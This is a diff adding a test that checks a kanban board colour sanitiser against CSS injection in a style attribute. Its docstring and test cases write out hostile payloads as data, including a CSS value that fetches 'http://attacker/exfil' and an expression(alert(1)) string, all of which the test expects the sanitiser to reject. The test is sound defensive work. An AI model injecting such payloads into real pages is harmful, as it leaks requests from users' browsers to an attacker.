@@ -463,3 +463,58 @@ def test_kanban_sse_refresh_is_debounced():
     assert "_kanbanRefreshScheduled" in PANELS
     # 250ms debounce window
     assert "}, 250)" in PANELS
+
+
+def test_kanban_board_color_is_validated_against_css_injection():
+    """`board.color` is interpolated into a `style=""` attribute on the
+    switcher icon. esc() escapes HTML but does NOT prevent CSS-context
+    injection: an attacker (with WebUI write access, or via the agent CLI
+    which doesn't validate either) could set color to
+    `red;background:url('http://attacker/exfil')` and have the malicious
+    URL fetched whenever any user opens the board switcher.
+
+    Drive the helper through Node and assert that named colors / hex
+    codes are accepted while every CSS-injection shape is rejected.
+    """
+    import json
+    import subprocess
+    script = """
+const fs = require('fs');
+const src = fs.readFileSync('static/panels.js', 'utf8');
+const start = src.indexOf('function _kanbanSafeColor');
+if (start < 0) { console.error('_kanbanSafeColor missing'); process.exit(2); }
+// Grab the function body up to and including the closing `}` line.
+const tail = src.slice(start);
+const end = tail.indexOf('\\n}\\n') + 2;
+const fn = tail.slice(0, end);
+const ctx = {};
+new Function('out', fn + '; out.fn = _kanbanSafeColor;')(ctx);
+const cases = [
+  ['#fff', '#fff'],
+  ['#3b82f6', '#3b82f6'],
+  ['red', 'red'],
+  ['Blue', 'Blue'],
+  // injection attempts must all collapse to '' so the renderer drops
+  // the `color:` rule entirely.
+  ["red;background:url('http://attacker/exfil')", ''],
+  ['red;background-image:url(http://x)', ''],
+  ['expression(alert(1))', ''],
+  ['#zzz', ''],
+  ['', ''],
+  [null, ''],
+  [undefined, ''],
+];
+const results = cases.map(([input, expected]) => ({
+  input, expected, actual: ctx.fn(input)
+}));
+console.log(JSON.stringify(results));
+"""
+    result = subprocess.run(["node", "-e", script], check=True, capture_output=True, text=True)
+    results = json.loads(result.stdout)
+    failures = [r for r in results if r["actual"] != r["expected"]]
+    assert not failures, f"_kanbanSafeColor mismatches: {failures}"
+
+    # The renderer must call the helper, not pass b.color through esc()
+    # directly into the style attribute.
+    assert "_kanbanSafeColor(b.color)" in PANELS
+    assert "color:${esc(b.color)}" not in PANELS
